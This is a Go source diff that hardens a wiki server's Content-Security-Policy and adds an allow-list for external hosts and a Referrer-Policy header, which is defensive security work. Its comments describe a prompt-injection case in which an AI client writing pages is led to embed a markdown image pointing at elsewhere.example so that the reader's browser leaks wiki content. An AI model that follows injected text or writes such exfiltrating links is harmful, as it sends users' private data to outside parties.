@@ -20,6 +20,7 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
+	"regexp"
 	"strings"
 	"sync"
 	"time"
@@ -69,30 +70,83 @@ func crossSite(r *http.Request) bool {
 	return err != nil || u.Host != r.Host
 }
 
-// What a page may run. Pages render their raw HTML as written, and pages are
-// also written by AI clients (MCP), which may have read a prompt injection: a
-// <script>, an onerror= or a javascript: link in a page would run with the
-// user's session and could read and rewrite the whole wiki. So only Zone's own
-// script files run (script-src 'self'; Zone has no inline scripts or
-// handlers), no plugins, no <base> that re-points those files, no form that
-// posts elsewhere. Clickjacking: another site could load Zone invisibly in a
-// frame and trick a signed-in user into clicking Delete or Commit, so only
-// Zone's own pages may frame it (a page's raw HTML may show an upload in an
-// <iframe>). A response with its own policy (an SVG upload's) keeps it and
-// gets only frame-ancestors added.
-const pageCSP = "script-src 'self'; object-src 'none'; base-uri 'self'; " +
-	"form-action 'self'; frame-ancestors 'self'"
+// What a page may run and load. Pages render their raw HTML as written, and
+// pages are also written by AI clients (MCP), which may have read a prompt
+// injection: a <script>, an onerror= or a javascript: link in a page would
+// run with the user's session and could read and rewrite the whole wiki. So
+// only Zone's own script files run (script-src 'self'; Zone has no inline
+// scripts or handlers), no plugins, no <base> that re-points those files, no
+// form that posts elsewhere.
+//
+// And a page loads nothing from other hosts: an image, a frame, a
+// stylesheet or a font there is a request the page's writer addresses, and
+// so a way to send the wiki away without any script: an assistant told to
+// (by text it read) writes ![](https://elsewhere.example/?what-it-read)
+// and the reader's browser delivers it; a frame from elsewhere shows a
+// sign-in form that isn't Zone's. So everything comes from Zone itself
+// (default-src 'self'), images, media and fonts also from data: (pasted
+// in), styles also inline (a page's own, KaTeX's, Mermaid's: they load
+// nothing, as their url()s are images). The external-content setting names
+// hosts images, media and frames may come from all the same ("*": any,
+// as before). Links stay: following one is the reader's doing.
+//
+// Clickjacking: another site could load Zone invisibly in a frame and trick
+// a signed-in user into clicking Delete or Commit, so only Zone's own pages
+// may frame it (a page's raw HTML may show an upload in an <iframe>). A
+// response with its own policy (an SVG upload's) keeps it and gets only
+// frame-ancestors added.
+func pageCSP(s *Settings) string {
+	external := ""
+	if len(s.External) > 0 {
+		external = " " + strings.Join(s.External, " ")
+	}
+	return "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; " +
+		"img-src 'self' data: blob:" + external + "; media-src 'self' data: blob:" + external + "; " +
+		"frame-src 'self'" + external + "; font-src 'self' data:; connect-src 'self'; " +
+		"object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'"
+}
+
+// externalRE: a host of the external-content setting, as a policy's source:
+// a name, with "*." for its subdomains, maybe a port; or "*", any host.
+var externalRE = regexp.MustCompile(`^(\*|(\*\.)?[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*(:\d+)?)$`)
+
+// loadsFrom: a page may load from host (a URL's, maybe with a port), as
+// the external-content setting says.
+func (s *Settings) loadsFrom(host string) bool {
+	if s == nil {
+		return false
+	}
+	host = strings.ToLower(host)
+	name := host
+	if i := strings.LastIndex(host, ":"); i >= 0 && !strings.HasSuffix(host, "]") {
+		name = host[:i]
+	}
+	for _, e := range s.External {
+		switch sub, wild := strings.CutPrefix(e, "*."); {
+		case e == "*", e == host, e == name:
+			return true
+		case wild && (strings.HasSuffix(host, "."+sub) || strings.HasSuffix(name, "."+sub)):
+			return true
+		}
+	}
+	return false
+}
 
 func contentPolicy(h http.Header) {
 	csp := h.Get("Content-Security-Policy")
 	if csp == "" {
-		h.Set("Content-Security-Policy", pageCSP)
+		h.Set("Content-Security-Policy", pageCSP(settings()))
 	} else if !strings.Contains(csp, "frame-ancestors") {
 		h.Set("Content-Security-Policy", csp+"; frame-ancestors 'self'")
 	}
 	h.Set("X-Frame-Options", "SAMEORIGIN") // browsers without CSP
 	// A JSON or text response is never run as a script (<script src=…>).
 	h.Set("X-Content-Type-Options", "nosniff")
+	// What a page does load from elsewhere (external-content) isn't told
+	// which page asked.
+	if h.Get("Referrer-Policy") == "" {
+		h.Set("Referrer-Policy", "same-origin")
+	}
 	if strings.Contains(h.Get("Content-Type"), "text/html") {
 		h.Set("Cache-Control", "no-store")
 	}
